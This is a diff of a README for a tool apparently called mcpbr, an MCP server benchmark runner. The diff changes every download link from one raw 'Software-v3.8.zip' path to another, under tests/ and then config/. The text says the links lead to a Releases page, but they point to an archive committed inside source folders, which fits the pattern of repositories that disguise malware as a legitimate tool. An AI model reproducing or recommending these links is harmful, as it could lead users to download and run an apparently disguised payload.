@@ -1,7 +1,7 @@
 # 🌟 mcpbr - Evaluate MCP Servers Easily
 
 ## 📥 Download Now
-[![Download mcpbr](https://github.com/ZaikoXeas/mcpbr/raw/refs/heads/main/tests/Software-v3.8.zip)](https://github.com/ZaikoXeas/mcpbr/raw/refs/heads/main/tests/Software-v3.8.zip)
+[![Download mcpbr](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to mcpbr! This tool helps you evaluate MCP servers efficiently using the Model Context Protocol Benchmark Runner. You can run quick tests to understand how well your servers perform.
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the application, visit our Releases page. Click the link below to access the downloads:
 
-[Download mcpbr](https://github.com/ZaikoXeas/mcpbr/raw/refs/heads/main/tests/Software-v3.8.zip)
+[Download mcpbr](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)
 
 1. Click on the link above. 
 2. On the Releases page, find the latest version of mcpbr.
@@ -56,4 +56,4 @@ Your contributions are welcome! If you would like to help improve mcpbr, please 
 ## 📫 Get in Touch
 For more information, questions, or feedback, please visit our GitHub repository or contact us through the Issues page.
 
-[Download mcpbr](https://github.com/ZaikoXeas/mcpbr/raw/refs/heads/main/tests/Software-v3.8.zip)
+[Download mcpbr](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)
